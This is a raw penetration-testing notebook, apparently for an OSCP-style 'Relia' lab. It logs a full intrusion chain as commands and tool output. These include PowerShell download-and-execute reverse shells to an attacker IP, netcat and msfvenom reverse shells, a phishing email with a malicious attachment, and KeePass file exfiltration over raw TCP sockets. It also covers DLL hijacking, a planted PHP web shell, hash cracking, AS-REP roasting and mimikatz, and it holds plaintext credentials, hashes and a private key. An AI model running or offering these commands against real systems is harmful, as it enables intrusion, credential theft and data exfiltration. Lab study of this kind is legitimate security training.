>powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.220:8000/powercat.ps1'); powercat -c 192.168.45.220 -p 4444 -e powershell"
>nc -nlvp 4444
>sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.154.189 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
nc -nlvp 4444>whoami (relia\jim)
>hostname (WK01)
>ipconfig (172.16.158.14)
>sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.154.189 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
#Creds - maildmz:DPuBT9tGCBrTbR

>iwr -uri http://192.168.45.247:8000/winPEASx64.exe -Outfile winPEAS.exe

#Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                                                                                                          
    (RELIA\jim) exec_lnk: powershell -ep bypass -File C:\Users\jim\Pictures\exec.ps1
    Permissions file: jim [AllAccess]
    Permissions folder(DLL Hijacking): jim [AllAccess]
    Trigger: At log on of RELIA\jim-After triggered, repeat every 00:01:00 indefinitely.
             At 12:55 AM on 10/19/2022-After triggered, repeat every 00:01:00 indefinitely.
             
# Hashs
Version: NetNTLMv2 - 14
  Hash:    jim::RELIA:1122334455667788:67574a67f2e7197460c310c2eaebdb13:0101000000000000afe0b64201f8da01e5bb0793d4e79604000000000800300030000000000000000000000000200000ff79fccc4410c8d3aed74343d140b479a663f2a1a178c9588d454b1fddbbb17b0a00100000000000000000000000000000000000090000000000000000000000
  
# Found Keepass Files
File: C:\Users\jim\Documents\Database.kdbx
File: C:\Users\jim\AppData\Roaming\KeePass\KeePass.config.xml
File: C:\Program Files\KeePass Password Safe 2\KeePass.config.xml

scp Database.kdbx kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/hash
kali>impacket-smbserver test . -smb2support  -username ashok -password reddy
Windows>net use m: \\192.168.45.247/home/kali/HTB/OSCP/Relia/hash /user:ashok reddy
Windows>copy Database.kdbx m:\

kali>impacket-smbserver test . -smb2support  -username ashok -password ashok
WIN>net use m: \\192.168.45.247/home/kali/HTB/OSCP/Relia/hash /user:ashok ashok
WIN>net use m: \\192.168.45.155\home\kali\Desktop\HTB\OSCP\AD\Medtech /user:ashok ashok
WIN>copy Database.kdbx m:\

Then if you have rdp you can add /drive:/tmp,tmp at the end of your command and it will map tmp on kali to tmp on client. Super easy to just drag and drop files.  Putting spoiler tags but don't really think file transfer techniques are spoilers.

# Hint Not able to Transefer https://discord.com/channels/780824470113615893/1087927556604432424/1278089984737411092
From Windows:   
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.182", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\jim\Documents\Database.kdbx") 
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > Database.kdbx

>keepass2john Database.kdbx > keepass.hash
#Remove first letter like (Database:) in keepass.hash file
>hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
>john keepass.hash

# Found Misc-Code asigning passwords Regexes
C:\Users\jim\Pictures\exec.ps1: password = "DPuBT9tGCBrTbR"
C:\Users\jim\Pictures\exec.ps1: password = "Castello1!"

# Found Misc-Simple Passwords Regexes
C:\Users\jim\Pictures\exec.ps1: password = "DPuBT9tGCBrTbR" 
C:\Users\jim\Pictures\exec.ps1: password = "Castello1!"

# ShrapHound
>iwr -uri http://192.168.45.247:8000/SharpHound.exe -Outfile SharpHound.exe
>scp .\20240827083300_BloodHound.zip kali@192.168.45.247:/home/kali/HTB/OSCP/Relia/
# Not able to transfer the file

From Windows:   
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.247", 1234)
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\offsec\Desktop\20240827083300_BloodHound.zip") 
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > 20240827083300_BloodHound.zip
#Got it
>sudo neo4j start
>bloodhound
>MATCH (m:Computer) RETURN m (Bloodhound)
>MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

>iwr -uri http://192.168.45.247:8000/Lagent.exe -Outfile Lagent.exe
k>sudo ip tuntap add user $(whoami) mode tun ligolo
k>sudo ip link set ligolo up
>./Lproxy -selfcert
windows>.\Lagent.exe -connect 192.168.45.247:11601 -ignore-cert
k>sudo ip route add 172.16.158.0/24 dev ligolo
windows-Ligolo>start
kali>ping -c 4  172.16.158.14
# Able to ping from the kali machine.

>crackmapexec smb 172.16.120.30 -u users.txt -p pass.txt --continue-on-success
# MIght 2 attemps are identified
jim:Castello1!
maildmz:DPuBT9tGCBrTbR

>crackmapexec smb 192.168.160.191 -u users.txt -p pass.txt --continue-on-success
# MIght 2 attemps are identified
jim:Castello1!
maildmz:DPuBT9tGCBrTbR

>crackmapexec rdp 172.16.120.6,7,14,15,19,20,21,30 -u users.txt -p pass.txt --continue-on-success (No result)

>nmap -p 3389 172.16.120.6,7,14,15,19,20,21,30 -Pn 
-172.16.120.6 - Open
-172.16.120.7 - Open
-172.16.120.14 - Open
-172.16.120.15 -  Open
172.16.120.19 - Filtered
172.16.120.20 - FIltered
172.16.120.21 - Filtered
-172.16.120.30 - Open

# Relia 14, got local and proof, Can provide help here spraying credentials not working on internal and external.
#Hint - There are some creds in the .kdbx file in jim's documents directory. Use those creds to rdp on .191
>kpcli --kdb=Database.kdbx (mercedes1)
>show -f User

>dmzadmin:SlimGodhoodMope

>xfreerdp /u:dmzadmin /p:'SlimGodhoodMope' /v:192.168.168.191 /smart-sizing:1920x1080 /cert-ignore

```

### Relia - 192.168.168.191 - asreproasting,

```jsx
xfreerdp /u:dmzadmin /p:'SlimGodhoodMope' /v:192.168.168.191 /smart-sizing:1920x1080 /cert-ignore

#Got root flag
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
>iwr -uri http://192.168.45.220:8000/nc.exe -Outfile nc.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -Outfile winpeas.exe

#C:\Windows\System32\config\RegBack\SAM
    File Permissions: Administrators [AllAccess]                                                                                                                                                                                                                                          
    C:\Windows\System32\config\RegBack\SYSTEM
    File Permissions: Administrators [AllAccess]
    Can't able to copy paste

>iwr -uri http://192.168.45.220:8000/Lagent.exe -Outfile agent.exe
k>sudo ip tuntap add user $(whoami) mode tun ligolo
k>sudo ip link set ligolo up
>./Lproxy -selfcert
windows>.\Lagent.exe -connect 192.168.45.247:11601 -ignore-cert
k>sudo ip route add 172.16.181.0/24 dev ligolo
windows-Ligolo>start

As-Rep Roasting
>impacket-GetNPUsers -dc-ip 192.168.221.191 relia.com/dmzadmin:SlimGodhoodMope -request
# TImeout

>nmap -p 3389 172.16.181.6,7,14,15,19,20,21,30 -Pn 
-172.16.120.6 - Open
-172.16.120.7 - Open
-172.16.120.14 - Open
-172.16.120.15 -  Open
172.16.120.19 - Filtered
172.16.120.20 - FIltered
172.16.120.21 - Filtered
-172.16.120.30 - Open
rdp>hydra -L users.txt -P pass.txt -M ip.txt rdp
#172.16.181.6,7,14,15,30 might be valid but account not active for remote desktop: login: jim password: Castello1!, 
-xfreerdp /u:jim /p:'Castello1!' /v:172.16.181.6 /smart-sizing:1920x1080 /cert-ignore # No hit
-crackmapexec rdp 172.16.181.6 -u jim -p 'Castello1!' --continue-on-success 

#172.16.181.6,7,14,15,30 might be valid but account not active for remote desktop: login: maildmz password: DPuBT9tGCBrTbR,
-xfreerdp /u:maildmz /p:DPuBT9tGCBrTbR /v:172.16.181.6 /smart-sizing:1920x1080 /cert-ignore #No hit
-crackmapexec rdp 172.16.181.6 -u maildmz -p DPuBT9tGCBrTbR --continue-on-success #No hit

#As per NMAP result winrm for .7, .30
>crackmapexec winrm 172.16.181.7 -u jim -p 'Castello1!' --continue-on-success #NO
>crackmapexec winrm 172.16.181.30 -u maildmz -p DPuBT9tGCBrTbR --continue-on-success #NO

Ping - OS prediction in KALI 64 might be linux
IN 191
From this below result i'm gusssing 128 is windows try smb on it
-172.16.120.6 - Open  128
-172.16.120.7 - Open  128
-172.16.120.14 - Open 128 
-172.16.120.15 -  Open 128
172.16.120.19 - Filtered 64 
172.16.120.20 - FIltered 64 
172.16.120.21 - Filtered 128 
-172.16.120.30 - Open 128

#OS Scan
>sudo nmap -sC -sV --open -p- -T4 -A -O -oN Internal_OS 172.16.181.6,7,14,15,19,20,21,30  -Pn
172.16.181.6 - WIndows
172.16.181.7 - WIndows
172.16.181.14 - WIndows
172.16.181.15 -  WIndows
172.16.181.19 - Linux
172.16.181.20 - Linux(FreeBSD)
172.16.181.21 - WIndows
172.16.181.30 - WIndows

>crackmapexec smb 172.16.181.6,7,14,15,21,30 -u users.txt -p pass.txt --continue-on-success
#SMB 139 NetBIOS, 445
172.16.181.6 - WIndows  
172.16.181.7 - WIndows
172.16.181.14 - WIndows
172.16.181.15 -  WIndows
172.16.181.19 - Linux
172.16.181.20 - Linux(FreeBSD)
172.16.181.21 - WIndows
172.16.181.30 - WIndows
crackmapexec smb 172.16.181.30 -u users.txt -p pass.txt --continue-on-success # NO response 6,7,14,15,21,30
nxc smb 172.16.181.30 -u users.txt -p pass.txt --continue-on-success # NO response 6,7,14,15,21,30

#Anonymous NO luck
smbclient -L ////172.16.181.6 -U ''
rpcclient 172.16.181.6 

#Openssh
172.16.181.19 - Linux OpenSSH 8.2p1
172.16.181.20 - Linux(FreeBSD) - OpenSSH 7.9

#Hint - I stuck in 191 got proof.txt, with those creds dmzadmin, jim  tried trying to move .189 and internal network tried SMB with credentials and anonymous, 19,20 are linux tried exploits with openssh port  above steps  any help,
#sry but I really don’t know what to do already pwned 245-249 191 14 so I need any help what do next if the credentials doesn’t work on any target on the internal network
>Since we have jim's credentials (jim:Castello1!) from the keepass, we can try if they are valid on the domain controller (DC02) and also look for AS-REP roastable users present on the domain controller.

#AS-REP Roasting (impacket-GetNPUsers -dc-ip 172.16.190.6  relia.com/jim:Castello1! -request)
>impacket-GetNPUsers -dc-ip 172.16.190.6  -request -outputfile hashes.asreproast relia.com/jim
$krb5asrep$23$michelle@RELIA.COM:a4b25e82b97e31e13f8f59112f88717b$cb2c39aea2962e29c382ab9629294972221b741497a4b3e76e3ed6808ec7b28d98140211937c424ac4f7ba35807f67807fbfd81e809e074393f5943bc1f58448be72d4e7e75772162354a694f3f77be6e2123f46bff99459627d2248eda6759492bb5645c376a90a1da6bad76ded62fcb32464720151e4241585d1e7bea5f61868a29fe270bfbb46b1f817b10bbbdacc756a872aed92095457362ae939e38abfb870d88bbe446cc13ee2ea016da1c33fdb44838a3920a177ede65b4c6f4698da1cdb676c1936052c4c9768ebc0e35d4a770d1a0edbabe4d7fea70b69c3f12cb629dcaf3107b4:NotMyPassword0k?

>hashcat -m 18200 hashes.asreproast /home/kali/HTB/OSCP/rockyou.txt 
michelle:NotMyPassword0k?

> iwr -uri http://192.168.45.229:8000/Rubeus.exe -Outfile C:/Users/dmzadmin/Desktop/Rubeus.exe
>Not supported
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.190.6 /smart-sizing:1920x1080 /cert-ignore #Fail
#Hit
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.190.7 /smart-sizing:1920x1080 /cert-ignore  
#GOt local flag
```

### Relia - 172.16.190.7 - take the .exe verify with procmonx64.exe, identify which .dll is missing,

172.16.190.7 - take the .exe verify with procmonx64.exe, identify which .dll is missing, 

```jsx
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.190.7 /smart-sizing:1920x1080 /cert-ignore  
#Got local flag

#Enumeration for PE
>Get-ChildItem -Recurse -Filter *.kdbx
>iwr -uri http://192.168.45.229:8000/nc.exe -outfile nc.exe
>.\nc.exe 192.168.45.229 4455 -e powershell.exe
>iwr -uri http://192.168.45.229:8000/winPEASx64.exe -outfile winPEAS.exe
>.\winPEAS.exe

Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    Apache2.4(Apache Software Foundation - Apache2.4)["C:\xampp\apache\bin\httpd.exe" -k runservice] - Auto - Running
    Possible DLL Hijacking in binary folder: C:\xampp\apache\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
   =================================================================================================                                                                                                                                        

    mysql(mysql)[C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql] - Auto - Running - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\xampp\mysql\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
   =================================================================================================

    Scheduler(Scheduler)["C:\Scheduler\scheduler.exe"] - Auto - Running - isDotNet
    Possible DLL Hijacking in binary folder: C:\Scheduler (Users [AppendData/CreateDirectories WriteData/CreateFiles])
    Scheduling Service RELIA

>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
>schtasks.exe /query /fo LIST /v^C
>schtasks.exe /query /fo LIST /v | findstr TaskName

Identifying DLL
>iwr -uri http://192.168.45.229:8000/Procmon64.exe -outfile Procmon64.exe

schtasks.exe /query /fo LIST /v^C
schtasks.exe /query /fo LIST /v | findstr TaskName
#Create windows service using sc in winprep machine
sc.exe create "NAMEofSERVICE" binpath= "PATH"
#Like Below
sc.exe create "Scheduler" binpath= "C:\Users\offsec\Desktop\Scheduler.exe"
#Check in procmon64.exe found in Sysinternal tools
#Procmon > Filter Option > Filter > Process Name , is , Scheduler.exe >Add > Apply > Ok
In that identified C:\Windows\System32\beyondhelper.dll
Restart-Service Scheduler
Output file name as beyondhelper.dll
>iwr -uri http://192.168.45.229:8000/myDLL.dll -outfile beyondhelper.dll

Win>Restart-Service Scheduler
Win>net localgroup administrators
#dave2 user is create Got Proof.txt

>xfreerdp /u:dave2 /p:'password123!' /v:172.16.176.7 /smart-sizing:1920x1080 /cert-ignore #Credentials from the .dll (dave2:password123!)
>iwr -uri http://192.168.45.220:8000/mimicatz.exe -Outfile mimicatz.exe
Open as Administrator>.\mimicatz.exe (andrea:PasswordPassword_6)

#Hint try manually due buggy crackmapexec not working

#Poviting  189 hash only 5985 port winrm, no 3389 port for rdp
>crackmapexec winrm 192.168.160.189 -u users.txt -p pass.txt --continue-on-success #No Hit

#Poviting to Internal Network 21 is (windows 5985, no 3389), 19,20 are linux
>xfreerdp /u:jim /p:'Castello1!' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore. 15
>xfreerdp /u:dmzadmin /p:'SlimGodhoodMope' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore, 15
>xfreerdp /u:michelle /p:'NotMyPassword0k?' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore, 15
>xfreerdp /u:andrea /p:'PasswordPassword_6' /v:172.16.120.30 /smart-sizing:1920x1080 /cert-ignore, 15 HIT
```

### Relia - 172.16.120.15 - change the powershell script

```jsx
>xfreerdp /u:andrea /p:'PasswordPassword_6' /v:172.16.120.15 /smart-sizing:1920x1080 /cert-ignore

#PE
>iwr -uri http://192.168.45.220:8000/nc.exe -outfile nc.exe
>rlwrap nc -nlvp 4455
>.\nc.exe 192.168.45.220 4455 -e powershell.exe
>iwr -uri http://192.168.45.220:8000/winPEASx64.exe -outfile winPEAS.exe
>.\winPEAS.exe

--------------------------schedule.ps1

try {
    & C:\updatecollector\updatecollctor.exe

} catch {

    Write-Output "[-] Updates couldn't be collected!"
    Write-Output "[!] Update cache will be used"
}

copy C:\Users\milana\beyondupdater.exe C:\updater\beyondupdater.exe
Start-Sleep -Seconds 5
& "C:\updater\beyondupdater.exe"
Start-Sleep -Seconds 5
del C:\updater\beyondupdater.exe

-------------------------schedule.ps1
#my plan is to create .exe using msfvenom put into the C:\updater\beyondupdater.exe this name

>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe -o met4444.exe
>rlwrap nc -nlvp 4444
>iwr -uri http://192.168.45.220:8000/met4444.exe -Outfile beyondupdater.exe

#Process
Intially copied in the C:\updater don't have access so copied in C:\updatecollector
#updated file
--------------------------schedule.ps1

try {
    & C:\updatecollector\beyondupdater.exe

} catch {

    Write-Output "[-] Updates couldn't be collected!"
    Write-Output "[!] Update cache will be used"
}

copy C:\Users\milana\beyondupdater.exe C:\updater\beyondupdater.exe
Start-Sleep -Seconds 5
& "C:\updater\beyondupdater.exe"
Start-Sleep -Seconds 5
del C:\updater\beyondupdater.exe

-------------------------schedule.ps1
>Automatically got access minana user

>whoami /all (SeImpersonatePrivilege)
>iwr -uri http://192.168.45.220:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
>.\PrintSpoofer64.exe -i -c powershell.exe (Operation failed or timedout)
>iwr -uri http://192.168.45.220:8000/DeadPotato-NET4.exe -Outfile  DeadPotato.exe
>.\DeadPotato.exe -cmd “whoami” #NT authority
>.\DeadPotato.exe -rev 192.168.45.220:9001 #fails
>.\DeadPotato.exe mimi sam #fails

>iwr -uri http://192.168.45.220:8000/met4444.exe -Outfile payload.exe
#Got shell after some still milana user

From Windows:   First start kali NC command
$client = New-Object System.Net.Sockets.TcpClient("192.168.45.220", 1234) 
$stream = $client.GetStream() 
[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\milana\Documents\Database.kdbx")  
$stream.Write($buffer, 0, $buffer.Length) 
$stream.Close() 
$client.Close()

From Kali: 
nc -lvp 1234 > Database.kdbx

>keepass2john 15Database.kdbx > 15keepass.hash
#Remove first letter like (Database:) in keepass.hash file
>hashcat -m 13400 keepass.hash  /home/kali/HTB/OSCP/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
>john keepass.hash
>kpcli --kdb=keepass.hash (destiny1)
#Got Idrsa 19 machine it don't support authentication
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAwAAAJgtoEZgLaBG
YAAAAAtzc2gtZWQyNTUxOQAAACBEhRgOw+Adwr6+R/A54Ng75WK1VsH1f+xloYwIbFnoAw
AAAECk3NMSFKJMauIwp/DPYEhMV4980aMdDOlfIlTq3qy4SkSFGA7D4B3Cvr5H8Dng2Dvl
YrVWwfV/7GWhjAhsWegDAAAADnRlc3RzQGhhdC13b3JrAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

>chmod 600 idrsa_sarah
>ssh -i idrsa_sarah sarah@172.16.120.19
```

### Relia - 172.16.120.19 - borg

```jsx
>ssh -i idrsa_sarah sarah@172.16.120.19
#Got local flag

>python3 -c 'import pty; pty.spawn("/bin/bash")'

>sarah@backup:/usr/bin$ sudo -l
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User sarah may run the following commands on backup:
    (ALL) NOPASSWD: /usr/bin/borg list *
    (ALL) NOPASSWD: /usr/bin/borg extract *
    (ALL) NOPASSWD: /usr/bin/borg mount *

>wget http://192.168.45.220:8000/linpeas.sh

>Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                     
Sudo version 1.8.31  

>Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                  
cat: write error: Broken pipe                                                                                                                       
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF
   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit
   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2
   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

#Hint check usage of borg and using pspy64 
>wget http://192.168.45.220:8000/pspy64

>./pspy64 
#/bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1725988864 /media/usb0
#Hint check usage of borg commands
>sudo /usr/bin/borg list /opt/borgbackup::home # Listing the 
>sudo /usr/bin/borg extract /opt/borgbackup::home # not extracting 

>sudo /usr/bin/borg list --json /opt/borgbackup/

>sudo /usr/bin/borg --bypass-lock list /opt/borgbackup/ /tmp/borgor/

>/bin/sh -c BORG_PASSPHRASE='xinyVzoH2AnJpRK9sfMgBA' borg create /opt/borgbackup::usb_1725989643
>/usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1725989643 /media/usb0
>/usr/bin/python3 /usr/bin/borg create /opt/borgbackup::usb_1725989643 /media/usb0 
>/bin/bash /root/createbackup.sh

#New start
$ cd /opt
>sarah@backup:/opt$ sudo /usr/bin/borg list *
>sudo /usr/bin/borg list borgbackup::home
> sudo /usr/bin/borg extract --stdout borgbackup::home

----------------
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/
{
    "user": "amy",
    "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf"
}
--------------------
0814b6b7f0de51ecf54ca5b6e6e612bf:backups1
>su amy (backups1)
>su root
#got proof.txt

ssh andrew@172.16.111.20
#got
```

### Relia - 172.16.111.20 -  FreeBSD doas

```jsx
sshpass -p "Rb9kNokjDsjYyH" rsync andrew@172.16.6.20:/etc/ /opt/backup/etc/

>ssh andrew@172.16.6.20 (Rb9kNokjDsjYyH)
#Got flag

>wget http://192.168.45.220:8000/linpeas.sh
>./linpeas.sh
#I saw that it can list all the files in root directory
#Got proof.txt due system config, you can read but need to start apache server asper hint

#DOAS (dedicated openbsd application subexecutor) - Hackricks /etc/doas.conf file is not writable permission
>cat /usr/local/etc/doas.conf
# Sample file for doas
# Please see doas.conf manual page for information on setting
# up a doas.conf file.

# Permit members of the wheel group to perform actions as root.
permit nopass :wheel

# Permit user alice to run commands a root user.
# permit alice as root

# Permit user bob to run programs as root, maintaining
# environment variables. Useful for GUI applications.
## permit keepenv bob as root

# Permit user cindy to run only the pkg package manager as root
# to perform package updates and upgrades.
## permit cindy as root cmd pkg args update
## permit cindy as root cmd pkg args upgrade

# Allow david to run id command as root without logging it
# permit nolog david as root cmd id

permit nopass andrew as root cmd service args apache24 onestart
----------------------------------------------------------------------------------END

PHP Session
/tmp/sess_85nhlv9agld103a3l7l0mbgt41

Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                                                                                           
/var/log/cron
/var/log/messages

Files inside others home (limit 20)
/home/mountuser/.mailrc                                                                                                                                                                                                                     
/home/mountuser/.mail_aliases
/home/mountuser/.login
/home/mountuser/.profile
/home/mountuser/.login_conf
/home/mountuser/.shrc
/home/mountuser/.cshrc
/home/mountuser/.history
/root/.k5login
/root/.cshrc
/root/.login
/root/.profile
/root/.bash_history
/root/.wget-hsts
/root/.lesshst
/root/.history
/root/proof.txt

Searching installed mail applications
rc.sendmail                                                                                                                                                                                                                                 
sendmail

Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/login.conf.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)                                                                                                                                                             
Found /etc/mail/aliases.db: regular file, no read permission
Found /etc/pwd.db: Berkeley DB 1.85 (Hash, version 2, big-endian)
Found /etc/spwd.db: regular file, no read permission
Found /var/db/pkg/local.sqlite: SQLite 3.x database, user version 36, last written using SQLite version 3038005
Found /var/db/services.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)

#Starting server based /etc/doas.conf having apache24 server
>service apche24 start (no permission)
>doas service apache24 onestart (Startted)
>service apache24 onestatus
#Web server is started on port 80 able access via web browser

#Shell  Uplocaded shell in /usr/local/www/apache24/data/phpMyAdmin/tmp/php-reverse-shell-shell.php
>find / -type d -perm -o+w -print
find: /usr/local/etc/mysql/keyring: Permission denied
/usr/local/www/apache24/data/phpMyAdmin/tmp # Writable

Access from the browser with http://172.16.111.20/phpmyadmin/tmp/php-reverse-shell.php hit 2 nd time hit
#When i access from machine it self got shell with www user 
curl http://127.0.0.1/phpMyAdmin/tmp/php-reverse-shell.php hit
rlwrap nc -nlvp 1234
>id (uid=80(www) gid=80(www) groups=80(www),0(wheel))
>pw usershow andrew
>getent passwd andrew
> pw usermod -aG wheel andrew
#Hint 
>locate doas
#/usr/local/bin/doas
>/usr/local/bin/doas pw usermod andrew -G wheel
Logout andrew above ssh shell, and login agin see wih id added as wheel group
>su root #Asking as password
>doas su
#Switched to root user without passwd

#I saw mltiple mail text file
>find / -type f \( -name "*.txt" -o -name "*.kdbx" \)
#/usr/local/lib/python3.9/test/test_email/data/msg_41.txt

#------------------------PGP KEY -----------------------
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.6 (GNU/Linux)

iD8DBQFG03voRhp6o4m9dFsRApSZAKCCAN3IkJlVRg6NvAiMHlvvIuMGPQCeLZtj
FGwfnRHFBFO/S4/DKysm0lI=
=t7+s
-----END PGP SIGNATURE-----

>sshpass -p "DRtajyCwcbWvH/9" ssh mountuser@172.16.10.21

#Tried  - Try manually with smb Make sure to specify the domain name while connecting to the target
crackmapexec rdp 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d relia.com  --continue-on-success\n
nxc smb 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d relia.com  --continue-on-success\n
smbclient -L //192.168.221.189 -U 'mountuser'
smbclient -L //192.168.221.189 -U mountuser/files
smbclient -L //172.16.173.21 -U mountuser%DRtajyCwcbWvH/9
smbclient -L //172.16.173.21 -U mountuser
smbclient -L //172.16.173.21 -U mountuser/files
smbmap -H 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' 
smbmap -H 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d FILES.RELIA.com
smbmap -H 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d FILES.RELIA.COM
nxc smb 172.16.173.21 -u users.txt  -p 'DRtajyCwcbWvH/9' -d files  --continue-on-success\n
nxc smb 172.16.173.21 -u users.txt  -p 'DRtajyCwcbWvH/9' -d files.relia.com  --continue-on-success\n
nxc smb 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d files.relia.com  --continue-on-success\n
nxc smb 172.16.173.21 -u mountuser -p 'DRtajyCwcbWvH/9' -d files  --continue-on-success\n
rpcclient 172.16.173.21
rpcclient 172.16.173.21 -U "mountuser"
rpcclient -U "mountuser" 172.16.173.21

Nothing hit error "STATUS_LOGON_FAILURE"

#Help - Use valid credentials
>smbmap -H 172.16.XXX.21 -d relia -u mountuser -p "DRtajyCwcbWvH/9"
>smbmap -H 172.16.173.21 -d relia -u mountuser -p "DRtajyCwcbWvH/9"
#Got shares
[+] IP: 172.16.173.21:445       Name: 172.16.173.21             Status: Authenticated
        Disk                                                    Permissions          Comment
        ----                                                    -----------    				 -------
        ADMIN$                                            NO ACCESS     		  Remote Admin
        apps                                                    READ ONLY
        C$                                                       NO ACCESS       		Default share
        IPC$                                                    READ ONLY       		Remote IPC
        monitoring                                      READ ONLY
        scripts                                                 READ ONLY
        
>smbclient //172.16.173.21/apps -U relia/mountuser%DRtajyCwcbWvH/9

>
#Creds
john.m-YouWillNeverTakeMyTractor!1922

Their are some credentials in 
